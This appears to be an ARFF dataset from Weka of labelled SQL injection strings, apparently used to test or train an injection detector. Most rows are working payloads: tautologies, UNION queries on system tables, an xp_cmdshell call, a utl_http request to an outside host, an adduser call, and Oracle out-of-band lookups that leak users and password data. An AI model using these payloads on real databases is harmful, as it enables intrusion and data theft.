@relation Test-weka.filters.unsupervised.attribute.NominalToString-C1-weka.filters.unsupervised.attribute.NumericToNominal-R2

@attribute sentence string
@attribute type {0,1}

@data
'a\' ',1
'a\' --',1
'a\' or 1 = 1; --',1
@,1
?,1
'\' and 1 = 0 )  union all',1
'? or 1 = 1 --',1
'x\' and userid is NULL; --',1
'x\' and email is NULL; --',1
'anything\' or \'x\' = \'x',1
'x\' and 1 =  ( select count ( * )  from tabname ) ; --',1
'x\' and members.email is NULL; --',1
'x\' or full_name like \'\%bob\%',1
'23 or 1 = 1; --',1
'\'; exec master..xp_cmdshell \'ping 172.10.1.255\'--',1
a,1
'1 or 1 = 1',1
'1\' or \'1\' = \'1',1
'1 and user_name (  )   =  \'dbo\'',1
1,1
'1\'1',1
'1 exec sp_  ( or exec xp_ ) ',1
'1 and 1 = 1',1
'1\' and 1 =  ( select count ( * )  from tablenames ) ; --',1
1,1
'1 and user_name (  )   =  \'dbo\'',1
'\'; desc users; --',1
'1\'1',1
'1\' and non_existant_table  =  \'1',1
'\' or username is not NULL or username  =  \'',1
'\'1 and ascii ( lower ( substring  (  (  select top 1 name from sysobjects where xtype = \'u\' ) , 1, 1  )  )   )  > 116\'',1
'\'1 union all select 1,2,3,4,5,6,name from sysobjects where xtype  =  \'u\' --\'',1
'1 uni/**/on select all from where',1
'â€™ or â€˜1â€™ = â€™1',1
'\' or \'1\' = \'1',1
'\'||utl_http.request ( \'httP://192.168.1.1/\' ) ||\'',1
'\'\' || myappadmin.adduser ( \'admin\', \'newpass\' )  || \'\'',1
'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT banner FROM v$version WHERE ROWNUM = 1  )  )   AND \'i\' = \'i',1
'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.LOGIN_USER FROM DUAL  )  )   AND \'i\' = \'i',1
'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.DATABASE_NAME FROM DUAL  )  )   AND \'i\' = \'i',1
'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT host_name FROM v$instance  )  )   AND \'i\' = \'i',1
'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT global_name FROM global_name  )  )   AND \'i\' = \'i',1
'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( USERNAME  )  )   FROM SYS.ALL_USERS  )  )   AND \'i\' = \'i',1
'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( PASSWORD  )  )   FROM SYS.USER$  )  )   AND \'i\' = \'i',1
'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( table_name  )  )   FROM sys.all_tables  )  )   AND \'i\' = \'i',1
'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( column_name  )  )   FROM sys.all_tab_columns  )  )   AND \'i\' = \'i',1
